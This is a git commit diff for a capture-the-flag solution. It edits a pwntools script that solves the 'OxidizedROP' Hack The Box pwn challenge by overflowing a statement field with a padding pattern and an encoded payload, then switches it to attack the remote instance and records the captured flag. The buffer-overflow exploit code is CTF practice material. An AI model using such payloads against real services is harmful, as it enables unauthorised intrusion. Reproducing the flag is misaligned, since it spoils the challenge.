a73c18223ee2b641039f74bf9614cd4ee2c50391
Zhang, Shunda <zhangshunda@gmail.com>
2023-04-08 11:27:36 +0000

    Solved pwn_oxidized_rop!

--- ctf/pwn/OxidizedROP/pwn_oxidized_rop/dec.py
+++ ctf/pwn/OxidizedROP/pwn_oxidized_rop/dec.py
@@ -16,13 +16,10 @@ payload = b'\xf0\x9e\x89\x80'
 #payload = b'@\xc3\xa2\x01'
 #print(payload)
 
-#for i in range(1, 200-4+1, 1):
-
-#s = b'A'*i + payload
 s = b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaaAB' + payload
-#io = remote(ip, port)
+io = remote(ip, port)
 #io = process('./oxidized-rop')
-io = gdb.debug('./oxidized-rop', 'break present_config_panel')
+#io = gdb.debug('./oxidized-rop', 'break present_config_panel')
 io.recvuntil(b'Selection:')
 io.sendline(b'1')
 io.recvuntil(b'Statement (max 200 characters):')
@@ -30,5 +27,4 @@ io.sendline(s)
 io.recvuntil(b'Selection:')
 io.sendline(b'2')
 io.interactive()
-io.close()
-
+#HTB{7h3_0r4n63_cr4b_15_74k1n6_0v3r!}
